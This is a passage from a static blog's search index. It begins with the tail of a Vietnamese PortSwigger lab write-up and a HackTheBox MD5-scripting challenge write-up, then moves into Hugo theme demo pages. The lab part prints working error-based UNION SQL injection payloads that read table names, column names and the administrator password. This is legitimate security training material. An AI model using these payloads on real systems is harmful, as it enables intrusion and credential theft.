thay null bằng một ví dụ của kiểu dữ liệu đó. Vd nếu muốn biết có phải integer không thì các bạn thay null = 1 hoặc string thì thay null = 'a' .Nếu không có lỗi gì xảy ra thì đúng là cái kiểu dữ liệu bạn đã thử hoặc có trường hợp có lỗi nó cũng báo luôn kiểu dữ liệu của cột đó như thế này\nTìm tên cột tên bảng Trong sql thường có một bảng tổng tên là information_schema.tables có cột table_name lưu tên tất cả các bảng trong cơ sở dữ liệu. Các bạn có thể tìm kiểm information schema + tên hệ quả trị CSDL để biết thêm. Còn đây là payload tiếp theo của mình\n ' UNION SELECT null, null, null, table_name, null, null, null, null FROM information_schema.tables--\n Tuy nhiên nó bị hiện lỗi như sau\nNghĩa là ở câu truy vấn gốc kiểu dữ liệu là integer nhưng câu sau UNION lại là character. Tiếp theo mình đã dùng hàm CAST() để ép kiểu từ character thành integer.\n ' UNION SELECT null, null, null, CAST(table_name as integer), null, null, null, null FROM information_schema.tables--\n Sở dĩ dùng hàm CAST() vì chắc chắn nó sẽ bị lỗi nếu đầu ra của table_name chứa một kí tự không phải số. Và một điều nữa là khi có lỗi thì nó sẽ hiện cái lỗi đấy ra và chúng ta sẽ đọc được như thế này.\nRồi sau khi có tên bảng ta tiếp tục tìm tên cột chứa password bằng payload sau\n ' UNION SELECT null, null, null, CAST(column_name as integer), null, null, null, null FROM information_schema.columns WHERE table_name = 'users' --\n Tuy nhiên nó không hiện ngay cái bảng chúng ta cần tìm, chúng ta lại tiếp tục sửa payload\n ' UNION SELECT null, null, null, CAST(column_name as integer), null, null, null, null FROM information_schema.columns WHERE table_name = 'users' AND column_name != 'username'--\n Tìm thông tin tiếp Cuối cùng là tìm đến mật khẩu của Administrator thôi\n' UNION SELECT null, null, null, CAST(password as integer), null, null, null, null FROM users WHERE username LIKE \u0026lsquo;%admin%\u0026rsquo; \u0026ndash;\nVà đây là kết quả\nTổng kết Như vậy là chúng ta đã đi qua một bài lab dài thật là dài. Hãy cùng xem lại những kiến thức vừa đi qua nhé\n Discover content. Serializable \u0026gt;\u0026lt; Deserializable. SQL Injection, cách tìm ra lần lượt các thành phần trong cơ sở dữ liệu.  ","description":"Insecure deserialization exploiting - Web Security Academy - PortSwigger.","id":10,"section":"posts","tags":["web","Insecure deserialization","PortSwigger Academy"],"title":"LAB  Developing a custom gadget chain for Java deserialization","uri":"https://ch1nhpd.github.io/posts/developing-a-custom-gadget-chain-for-java-deserialization/"},{"content":"Xin chào, hôm nay chúng ta cùng đến với một Challenge về mảng Web trên Hackthebox nhé!\nReady!! Đây là giao diện của trang web khi mình bắt đầu truy cập.\nQua đây cộng với phần mô tả của challenge thì chúng ta có thể biết việc của mình là phải encript chuỗi r4q6q5pBOCNyWXcqV0EHbằng thuật toán MD5.\nMình đã thử encript sau đó submit nhưng kết quả nhận được là to slow!.\nVì vậy phải có một cách khác nhanh hơn chính là viết script để tự động hóa việc submit. Các bạn sẽ có rất nhiều cách để viết scritp và ở đây mình dùng python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import requests import hashlib url = \u0026#39;http://142.93.44.199:31032\u0026#39; r = requests.session() rp = r.get(url).text x = rp.split(\u0026#34;\u0026lt;h3 align=\u0026#39;center\u0026#39;\u0026gt;\u0026#34;)[1] string = x.split(\u0026#39;\u0026lt;\u0026#39;)[0] h = hashlib.md5(string.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() data={\u0026#39;hash\u0026#39;: h} response=r.post(url = url, data = data) print(response.text)   Phân tích code  Đầu tiên mình tạo một request tới trang web kia.Và đây là kết quả của biến rp (Sau khi code chạy xong dòng 7)\n1 2 3 4 5 6 7 8 9 10 11 12  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;emdee five for life\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body style=\u0026#34;background-color:powderblue;\u0026#34;\u0026gt; \u0026lt;h1 align=\u0026#39;center\u0026#39;\u0026gt;MD5 encrypt this string\u0026lt;/h1\u0026gt;\u0026lt;h3 align=\u0026#39;center\u0026#39;\u0026gt;zguJrmZCRFfHNNnR5clq\u0026lt;/h3\u0026gt;\u0026lt;center\u0026gt;\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;hash\u0026#34; placeholder=\u0026#34;MD5\u0026#34; align=\u0026#39;center\u0026#39;\u0026gt;\u0026lt;/input\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt;\u0026lt;/input\u0026gt; \u0026lt;/form\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Việc tiếp theo là phải cắt được đoạn string (trong trường hợp này là: zguJrmZCRFfHNNnR5clq ) để mã hóa rồi submit. Có rất nhiều cách để có thể cắt được chuỗi đó. Và ở đây mình dùng thấy chỉ có một \u0026lt;h3 align='center'\u0026gt; nên nếu mình dùng hàm split thì sẽ cắt được đoạn html thành hai hai phần.  Kết quả của hàm split trong trường hợp này một cái mảng gồm hai phần tử (bên trái và bên phải của \u0026lt;h3 align='center'\u0026gt;)\n  Khi đó ta thấy chuỗi cần lấy ra nằm ở ngay đầu phần tử thứ [1] của mảng. Tiếp tục căt phần tử ấy theo \u0026lt; thì ta được chuỗi đó nằm ở vị trí [0] của mảng lần này. (Dòng 9) Sau đó ta thực hiện mã hóa chuỗi bằng thuật toán MD5 (Dòng 11) Để gửi được đi thì ta phải chuẩn hóa nó theo dạng cấu trúc như dòng thứ 12. Chữ hash là giá trị của biến name của thẻ input trong đoạn html của biến rp. Cuối cùng là post lên để nhận flag.  Note Có thể bạn chạy code lần đầu sẽ không thấy flag. Nguyên nhân là do dán MD5 vào vẫn chậm hơn yêu cầu bài toán. Bạn có thể khắc phục bằng cách tối ưu đoạn code hoặc sử dụng ngôn ngữ khác với những thuật toán nhanh hơn. Còn không thì chạy lại vài lần và đây là kết quả:\nTổng kết  Sử dụng hàm split để cắt chuỗi. Sử dụng thư viện requests để kết nối, gửi nhận dữ liệu. Sử dụng thư viện hashlib để mã hóa thông tin.\nNgoài ra có thể mã hóa MD5 ở đây  ","description":"Challenge web - HACK THE BOX.","id":11,"section":"posts","tags":["web","hackthebox","challenge"],"title":"Emdee five for life writeup HACK THE BOX","uri":"https://ch1nhpd.github.io/posts/emdee-five-for-life-writeup-hackthebox/"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Inline  Markdown  In  Table     italics bold strikethrough  code    Code Blocks Code block with backticks html\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rCode block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item   First Sub-item Second Sub-item  Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn: Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nYouTube Privacy Enhanced Shortcode   Twitter Simple Shortcode .twitter-tweet { font: 14px/1.45 -apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif; border-left: 4px solid #2b7bb9; padding-left: 1.5em; color: #555; } .twitter-tweet a { color: #2b7bb9; text-decoration: none; } blockquote.twitter-tweet a:hover, blockquote.twitter-tweet a:focus { text-decoration: underline; }  “In addition to being more logical, asymmetry has the advantage that its complete appearance is far more optically effective than symmetry.”\n— Jan Tschichold pic.twitter.com/gcv7SrhvJb\n\u0026mdash; Graphic Design History (@DesignReviewed) January 17, 2019 Vimeo Simple Shortcode  .__h_video { position: relative; padding-bottom: 56.23%; height: 0; overflow: hidden; width: 100%; background: #000; } .__h_video img { width: 100%; height: auto; color: #000; } .__h_video .play { height: 72px; width: 72px; left: 50%; top: 50%; margin-left: -36px; margin-top: -36px; position: absolute; cursor: pointer; }    The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"Sample article showcasing basic Markdown syntax and formatting for HTML elements.","id":12,"section":"test","tags":["markdown"],"title":"Markdown Syntax Guide","uri":"https://ch1nhpd.github.io/test/markdown-syntax/"},{"content":"Markdownify box This is boxmd shortcode Simple box This is **box** shortcode\r Code tabs Make it easy to switch between different code\njava\rjavascript\r\r1  System.out.println(\u0026#39;Hello World!\u0026#39;);   \r\r1  console.log(\u0026#39;Hello World!\u0026#39;);   \r\r\r\r'use strict';\rvar containerId = JSON.parse(\"\\\"ba50b53260040f49\\\"\");\rvar containerElem = document.getElementById(containerId);\rvar codetabLinks = null;\rvar codetabContents = null;\rvar ids = [];\rif (containerElem) {\rcodetabLinks = containerElem.querySelectorAll('.codetab__link');\rcodetabContents = containerElem.querySelectorAll('.codetab__content');\r}\rfor (var i = 0; i 0) {\rcodetabContents[0].style.display = 'block';\r}\r Tabs for general purpose Windows\rMacOS\rUbuntu\r\rWindows section 1  console.log(\u0026#39;Hello World!\u0026#39;);   ⚠️Becareful that the content in the tab should be different from each other. The tab makes unique id hashes depending on the tab contents. So, If you just copy-paste the tabs with multiple times, since it has the same contents, the tab will not work.\n\rMacOS section Hello world!\r\rUbuntu section Great!\r\r\r\r'use strict';\rvar containerId = JSON.parse(\"\\\"3b414d01b5004889\\\"\");\rvar containerElem = document.getElementById(containerId);\rvar tabLinks = null;\rvar tabContents = null;\rvar ids = [];\rif (containerElem) {\rtabLinks = containerElem.querySelectorAll('.tab__link');\rtabContents = containerElem.querySelectorAll('.tab__content');\r}\rfor (var i = 0; i 0) {\rtabContents[0].style.display = 'block';\r}\r Expand \r\rExpand me\r\rTitle contents\r\r \r\rExpand me2\r\rTitle2 contents2\r\r Alert Colored box\nthis is a text this is a text this is a text this is a text Notice success text\r info text\r warning text\r error text\r ","description":"tabs, code-tabs, expand, alert, warning, notice, img, box","id":13,"section":"test","tags":["markdown"],"title":"Shortcodes","uri":"https://ch1nhpd.github.io/test/shortcodes/"},{"content":"Code Syntax Highlighting Verify the following code blocks render as code blocks and highlight properly.\nMore about tuning syntax highlighting is the Hugo documentation.\nDiff 1 2 3 4 5 6 7 8 9 10  *** /path/to/original\t\u0026#39;\u0026#39;timestamp\u0026#39;\u0026#39; --- /path/to/new\t\u0026#39;\u0026#39;timestamp\u0026#39;\u0026#39; *************** *** 1 **** ! This is a line. --- 1 --- ! This is a replacement line. It is important to spell -removed line +new line   *** /path/to/original\t\u0026#39;\u0026#39;timestamp\u0026#39;\u0026#39; --- /path/to/new\t\u0026#39;\u0026#39;timestamp\u0026#39;\u0026#39; *************** *** 1 **** ! This is a line. --- 1 --- ! This is a replacement line. It is important to spell -removed line +new line Makefile CC=gcc CFLAGS=-I. hellomake: hellomake.o hellofunc.o $(CC) -o hellomake hellomake.o hellofunc.o -I. 1 2 3 4 5  CC=gcc CFLAGS=-I. hellomake: hellomake.o hellofunc.o $(CC) -o hellomake hellomake.o hellofunc.o -I.   JSON 1 2 3  {\u0026#34;employees\u0026#34;:[ {\u0026#34;firstName\u0026#34;:\u0026#34;John\u0026#34;, \u0026#34;lastName\u0026#34;:\u0026#34;Doe\u0026#34;}, ]}   Markdown 1 2 3  **bold** *italics* [link](www.example.com)   JavaScript 1  document.write(\u0026#39;Hello, world!\u0026#39;);   CSS 1 2 3  body { background-color: red; }   Objective C 1 2 3 4 5 6  #import \u0026lt;stdio.h\u0026gt;  int main (void) { printf (\u0026#34;Hello world!\\n\u0026#34;); }   Python 1  print \u0026#34;Hello, world!\u0026#34;   XML 1 2 3 4 5  \u0026lt;employees\u0026gt; \u0026lt;employee\u0026gt; \u0026lt;firstName\u0026gt;John\u0026lt;/firstName\u0026gt; \u0026lt;lastName\u0026gt;Doe\u0026lt;/lastName\u0026gt; \u0026lt;/employee\u0026gt; \u0026lt;/employees\u0026gt;   Perl 1  print \u0026#34;Hello, World!\\n\u0026#34;;   Bash 1  echo \u0026#34;Hello World\u0026#34;   PHP 1  \u0026lt;?php echo \u0026#39;\u0026lt;p\u0026gt;Hello World\u0026lt;/p\u0026gt;\u0026#39;; ?\u0026gt;  CoffeeScript 1  console.log(“Hello world!”);   C# 1 2 3 4 5 6 7 8  using System; class Program { public static void Main(string[] args) { Console.WriteLine(\u0026#34;Hello, world!\u0026#34;); } }   C++ 1 2 3 4 5 6 7  #include \u0026lt;iostream.h\u0026gt; main() { cout \u0026lt;\u0026lt; \u0026#34;Hello World!\u0026#34;; return 0; }   SQL 1 2  SELECTcolumn_name,column_nameFROMtable_name;  Go 1 2 3 4 5  package main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, 世界\u0026#34;) }   Ruby 1  puts \u0026#34;Hello, world!\u0026#34;   Java 1 2 3 4 5 6 7 8 9 10 11 12  import javax.swing.JFrame; //Importing class JFrame import javax.swing.JLabel; //Importing class JLabel public class HelloWorld { public static void main(String[] args) { JFrame frame = new JFrame(); //Creating frame  frame.setTitle(\u0026#34;Hi!\u0026#34;); //Setting title frame  frame.add(new JLabel(\u0026#34;Hello, world!\u0026#34;));//Adding text to frame  frame.pack(); //Setting size to smallest  frame.setLocationRelativeTo(null); //Centering frame  frame.setVisible(true); //Showing frame  } }   Latex Equation 1  \\frac{d}{dx}\\left( \\int_{0}^{x} f(u)\\,du\\right)=f(x).   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  import {x, y} as p from \u0026#39;point\u0026#39;; const ANSWER = 42; class Car extends Vehicle { constructor(speed, cost) { super(speed); var c = Symbol(\u0026#39;cost\u0026#39;); this[c] = cost; this.intro = `This is a car runs at ${speed}.`; } } for (let num of [1, 2, 3]) { console.log(num + 0b111110111); } function $initHighlight(block, flags) { try { if (block.className.search(/\\bno\\-highlight\\b/) != -1) return processBlock(block.function, true, 0x0F) + \u0026#39; class=\u0026#34;\u0026#34;\u0026#39;; } catch (e) { /* handle exception */ var e4x = \u0026lt;div\u0026gt;Example \u0026lt;p\u0026gt;1234\u0026lt;/p\u0026gt;\u0026lt;/div\u0026gt;; } for (var i = 0 / 2; i \u0026lt; classes.length; i++) { // \u0026#34;0 / 2\u0026#34; should not be parsed as regexp  if (checkCondition(classes[i]) === undefined) return /\\d+[\\s/]/g; } console.log(Array.every(classes, Boolean)); } export $initHighlight;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Hello world\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#39;http://fonts.googleapis.com/css?family=Roboto:400,400italic,700,700italic\u0026#39; rel=\u0026#39;stylesheet\u0026#39; type=\u0026#39;text/css\u0026#39;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;index.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;//cdnjs.cloudflare.com/ajax/libs/less.js/2.5.1/less.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;vendor/prism.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;examples.bundle.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  /********************************************************* * General */ pre[class*=\u0026#34;language-\u0026#34;], code { color: #5c6e74; font-size: 13px; text-shadow: none; font-family: Consolas, Monaco, \u0026#39;Andale Mono\u0026#39;, \u0026#39;Ubuntu Mono\u0026#39;, monospace; direction: ltr; text-align: left; white-space: pre; word-spacing: normal; word-break: normal; line-height: 1.5; tab-size: 4; hyphens: none; } pre[class*=\u0026#34;language-\u0026#34;]::selection, code::selection { text-shadow: none; background: #b3d4fc; } @media print { pre[class*=\u0026#34;language-\u0026#34;], code { text-shadow: none; } } pre[class*=\u0026#34;language-\u0026#34;] { padding: 1em; margin: .5em 0; overflow: auto; background: #f8f5ec; } :not(pre) \u0026gt; code { padding: .1em .3em; border-radius: .3em; color: #db4c69; background: #f9f2f4; }   ","description":"Syntax highlighting test","id":14,"section":"test","tags":["markdown"],"title":"Syntax highlighting","uri":"https://ch1nhpd.github.io/test/syntax-highlight/"},{"content":"Sample images from Pixabay\n","description":"cartoon gallery","id":15,"section":"gallery","tags":null,"title":"Cartoon","uri":"https://ch1nhpd.github.io/gallery/cartoon/"},{"content":"Sample images from Pixabay\n","description":"photo gallery","id":16,"section":"gallery","tags":null,"title":"Photo","uri":"https://ch1nhpd.github.io/gallery/photo/"},{"content":"Written in Go, Hugo is an open source static site generator available under the Apache Licence 2.0. Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.\nHugo makes use of a variety of open source projects including:\n https://github.com/russross/blackfriday https://github.com/alecthomas/chroma https://github.com/muesli/smartcrop https://github.com/spf13/cobra https://github.com/spf13/viper  Hugo is ideal for blogs, corporate websites, creative portfolios, online magazines, single page applications or even a website with thousands of pages.\nHugo is for people who want to hand code their own website without worrying about setting up complicated runtimes, dependencies and databases.\nWebsites built with Hugo are extremelly fast, secure and can be deployed anywhere including, AWS, GitHub Pages, Heroku, Netlify and any other hosting provider.\nLearn more and contribute on GitHub.\n","description":"Hugo, the world’s fastest framework for building websites","id":17,"section":"","tags":null,"title":"About","uri":"https://ch1nhpd.github.io/about/"}]